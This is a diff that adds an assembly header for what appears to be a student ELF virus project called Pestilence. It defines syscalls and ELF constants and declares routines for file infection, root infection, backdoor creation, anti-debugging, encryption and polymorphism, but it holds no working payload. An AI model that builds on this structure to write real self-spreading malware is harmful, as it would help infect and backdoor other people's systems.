@@ -1,0 +1,212 @@
+%ifndef PESTILENCE
+
+; Protection against double inclusion
+	%define PESTILENCE
+
+; Syscall numbers
+	%define PAGE_SIZE (4096 * 4)
+	%define SYS_READ 0
+	%define SYS_WRITE 1
+	%define SYS_OPEN 2
+	%define SYS_CLOSE 3
+	%define SYS_LSEEK 8
+	%define SYS_MMAP 9
+	%define SYS_MUNMAP 11
+	%define SYS_GETPID 39
+	%define SYS_FORK 57
+	%define SYS_EXECVE 59
+	%define SYS_EXIT 60
+	%define SYS_FLOCK 73
+	%define SYS_RENAME 82
+	%define SYS_UNLINK 87
+	%define SYS_SYMLINK 88
+	%define SYS_PTRACE 101
+	%define SYS_GETEUID 107
+	%define SYS_GETDENTS64 217
+	%define SYS_KILL 62
+
+; Open flags
+	%define O_RDWR 2
+	%define O_RDONLY 0
+	%define O_CREAT 64
+	%define O_TRUNC 512
+
+; Open mode
+	%define S_IRWXU 448
+	%define S_IRWXG 56
+	%define S_IRWXO 7
+	%define S_IRGRP 32
+	%define S_IROTH 4
+	%define S_IXGRP 8
+	%define S_IXOTH 1
+
+; Mmap protection
+	%define PROT_READ 1
+	%define PROT_WRITE 2
+	%define PROT_EXEC 4
+
+; Mmap flags
+	%define MAP_PRIVATE 2
+	%define MAP_ANONYMOUS 32
+
+; Lseek
+	%define SEEK_SET		0
+	%define SEEK_SET		2
+
+; Ptrace
+	%define PTRACE_TRACEME	0
+	%define PTRACE_DETACH	17
+
+; Kill
+	%define SIGCONT			18
+
+; Getdents64
+	%define DT_DIR			4
+	%define DT_REG			8
+
+; ELF
+	%define ELFMAGIC		0x464c457f
+	%define ELFCLASS64		2
+	%define ET_EXEC			2
+	%define PF_X			1
+	%define PF_W			2
+	%define PF_R			4
+	%define PT_LOAD			1
+
+; flock flags
+	%define LOCK_EX			2
+	%define LOCK_UN			8
+	%define LOCK_NB			4
+
+; Usefull macros
+
+	;; -----------------------------------------------------------------------------
+	;; JUNK macro for NOPsleds
+	;; -----------------------------------------------------------------------------
+	%macro	JUNK 1
+		%rep	%1
+			nop
+		%endrep
+	%endmacro
+
+; includes
+	%ifndef FAMINE_S
+		extern _start
+		extern _string
+		extern _o_entry
+		extern _force_exit
+		extern _jmp_to_o_entry
+		extern _verif
+		extern _verify_o_entry
+	%endif
+
+	%ifndef ENCRYPTED_START_S
+		extern _encrypted_part_start
+		extern _continue_normaly
+	%endif
+
+	%ifndef OPTIONS_S
+		extern _start_infect
+		extern _infect_from_root
+		extern _verify_starting_infect
+		extern _exit_properly
+	%endif
+
+	%ifndef TREAT_FILE_S
+		extern _treat_file
+		extern _final_end
+	%endif
+
+	%ifndef UPDATE_MMAPED_FILE_S
+		extern _update_mmaped_file
+	%endif
+
+	%ifndef FORK_S
+		extern _thread_create
+		extern _fork_before_exec_normaly
+		extern _fork_before_infect_root
+	%endif
+
+	%ifndef DEPACKER_S
+		extern _decrypt
+		extern _end_decrypt
+		extern _checksum
+	%endif
+
+	%ifndef ENCRYPT_S
+		extern _encrypt_zone
+	%endif
+
+	%ifndef CHECKDBG_S
+		extern _checkdbg
+	%endif
+
+	%ifndef CHECKPROC_S
+		extern _checkproc
+	%endif
+
+	%ifndef FT_STRSTR_S
+		extern _ft_strstr
+		extern _ft_strxequ
+	%endif
+
+	%ifndef FT_STREQU_S
+		extern _ft_strequ
+	%endif
+
+	%ifndef FT_STRLEN_S
+		extern _ft_strlen
+	%endif
+
+	%ifndef FT_ATOI_S
+		extern _ft_atoi
+	%endif
+
+	%ifndef FT_ITOA_S
+		extern _ft_itoa
+	%endif
+
+	%ifndef CHECKDBG_BY_STATUS_S
+		extern _checkdbg_by_status_file
+	%endif
+
+	%ifndef FT_IS_INTEGER_STRING_S
+		extern _ft_is_integer_string
+	%endif
+
+	%ifndef READDIR_S
+		extern _read_dir
+	%endif
+
+	%ifndef PADDING_S
+		extern _padding
+	%endif
+
+	%ifndef CRC32_S
+		extern _crc32
+	%endif
+
+	%ifndef CREATE_BACKDOOR_S
+		extern _create_backdoor
+	%endif
+
+	%ifndef FAMINE_OPTIONS_S
+		extern _famine_start_options
+	%endif
+
+	%ifndef POLYMORPHISM_S
+		extern	_timestamp
+		extern	_prng
+		extern	_urand
+		extern	_byterpl
+	%endif
+
+	%ifndef TABLE_S
+		extern _table_offset
+	%endif
+
+	%ifndef JUMP_TO_FUNCTION_S
+		extern _jump_to_function
+		extern _functions_offset_from_start
+	%endif
+%endif
